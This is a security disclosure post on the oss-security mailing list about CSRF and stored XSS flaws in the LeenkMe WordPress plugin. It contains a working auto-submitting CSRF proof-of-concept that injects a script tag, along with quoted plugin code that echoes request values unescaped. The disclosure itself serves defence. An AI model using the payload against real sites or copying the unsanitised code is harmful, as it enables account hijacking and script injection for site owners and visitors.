  oss-security - CSRF and Stored XSS in a WORDPRESS Plugin LeenkMe version            Products  Openwall GNU/*/Linux   server OS Linux Kernel Runtime Guard John the Ripper   password cracker  Free & Open Source for any platform in the cloud Pro for Linux Pro for macOS  Wordlists   for password cracking passwdqc   policy enforcement  Free & Open Source for Unix Pro for Windows (Active Directory)  yescrypt   KDF & password hashing yespower   Proof-of-Work (PoW) crypt_blowfish   password hashing phpass   ditto in PHP tcb   better password shadowing Pluggable Authentication Modules scanlogd   port scan detector popa3d   tiny POP3 daemon blists   web interface to mailing lists msulogin   single user mode login php_mt_seed   mt_rand() cracker  Services Publications  Articles Presentations  Resources  Mailing lists Community wiki Source code repositories (GitHub) Source code repositories (CVSweb) File archive & mirrors How to verify digital signatures OVE IDs  What's new         Follow @Openwall on Twitter for new release announcements and other news   [<prev] [next>] [day] [month] [year] [list]  Date: Sat, 16 Apr From: shravan kumar To: oss-security@...ts.openwall.com Subject: CSRF and Stored XSS in a WORDPRESS Plugin LeenkMe version  Hello ,  I would like to disclose CSRF and stored XSS vulnerability in Wordpress plugin LeenkMe version  The plugin can be found at https://wordpress.org/plugins/leenkme/  In the page wp-content/plugins/leenkme/facebook.php  XSS vulnerable Fields are :     - facebook_message    - facebook_linkname    - facebook_caption    - facebook_description    - default_image    - _wp_http_referer   This CSRF is tested on latest wordpress installation using firefox browser.  The Code for CSRF.html is  <html>   <body onload="document.forms['xss'].submit()" >     <form name="xss" action=" method="POST">       <input type="hidden" name="facebook_profile" value="on" />       <input type="hidden" name="fb_publish_wpnonce" value="" />       <input type="hidden" name="_wp_http_referer" value="XSS" />       <input type="hidden" name="facebook_message" value="XSS" />       <input type="hidden" name="facebook_linkname" value="XSS" />       <input type="hidden" name="facebook_caption" value="XSS" />       <input type="hidden" name="facebook_description" value=" </textarea><script>prompt();</script>" />       <input type="hidden" name="default_image" value="XSS" />       <input type="hidden" name="message_preference" value="author" />       <input type="hidden" name="clude" value="in" />       <input type="hidden" value="0" />       <input type="hidden" name="update_facebook_settings" value="Save&#32;Settings" />       <input type="submit" value="Submit form" />     </form>   </body> </html>   The vulnerable page is  wp-content/plugins/leenkme/facebook.php  The vulnerable code producing XSS is   if ( !empty( $_REQUEST['facebook_message'] ) ) $user_settings['facebook_message'] = $_REQUEST['facebook_message']; else $user_settings['facebook_message'] = ''; if ( !empty( $_REQUEST['facebook_linkname'] ) ) $user_settings['facebook_linkname'] = $_REQUEST['facebook_linkname']; else $user_settings['facebook_linkname'] = ''; if ( !empty( $_REQUEST['facebook_caption'] ) ) $user_settings['facebook_caption'] = $_REQUEST['facebook_caption']; else $user_settings['facebook_caption'] = ''; if ( !empty( $_REQUEST['facebook_description'] ) ) $user_settings['facebook_description'] = $_REQUEST['facebook_description'];   ------------------------- ------------------------- ------------------------- snip ------------------------ ------------------------- --------------------------  <td><textarea name="facebook_message" style="width: echo $user_settings['facebook_message']; ?></textarea></td>                             </tr>                             <tr>                              <td><?php _e( 'Default Link Name:', 'leenkme' ); ?></td>                                 <td><input name="facebook_linkname" type="text" style="width: value="<?php echo $user_settings['facebook_linkname']; ?>"                              </tr>                             <tr>                              <td><?php _e( 'Default Caption:', 'leenkme' ); ?></td>                                 <td><input name="facebook_caption" type="text" style="width: value="<?php echo $user_settings['facebook_caption']; ?>"                             </tr>                             <tr>                              <td style='vertical-align: top; padding-top: 5px;'><?php _e( 'Default Description:', 'leenkme' ); ?></td>                                 <td><textarea name="facebook_description" style="width: echo $user_settings['facebook_description']; ?></textarea></td>   The code used to protect against CSRF that is the anti csrf token used is  <?php wp_nonce_field( 'fb_publish', 'fb_publish_wpnonce' ); ?>   But this code is not protecting against the CSRF, the form get submitted successfully with out any error even though the fb_publish_wpnonce is kept empty resulting in CSRF vulnerability.  --  Shravan Kumar   Powered by blists - more mailing lists  Please check out the  Open Source Software Security Wiki, which is counterpart to this mailing list.  Confused about mailing lists and their use? Read about mailing lists on Wikipedia and check out these guidelines on proper formatting of your messages.      